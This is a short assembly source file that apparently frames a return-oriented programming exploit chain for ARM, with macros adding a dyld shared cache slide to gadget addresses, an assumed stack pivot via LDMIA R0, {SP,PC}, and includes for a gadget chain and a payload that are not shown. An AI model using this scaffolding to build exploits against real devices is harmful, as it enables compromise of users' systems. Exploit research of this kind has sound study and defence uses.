;%define ROPE_ADDRESS	0x100000
;%define CACHE_SLIDE	0x200000

segment .text
	org	ROPE_ADDRESS

%macro	dg	1
	dd	%1 + CACHE_SLIDE	; just add the slide at compile-time
%endmacro
;%define dg	dd	CACHE_SLIDE +

%define du	dd			; we are org-ed at the right address

rope:
; assume we pivot by LDMIA R0, {SP,PC}
        du    __ropstack + 4                ; -> SP
__ropstack:
%include "rope.asm"
	align	8
payload:
%include "payload.inc"
	align	8
dyld_header:
	times	0x1000 dd 0
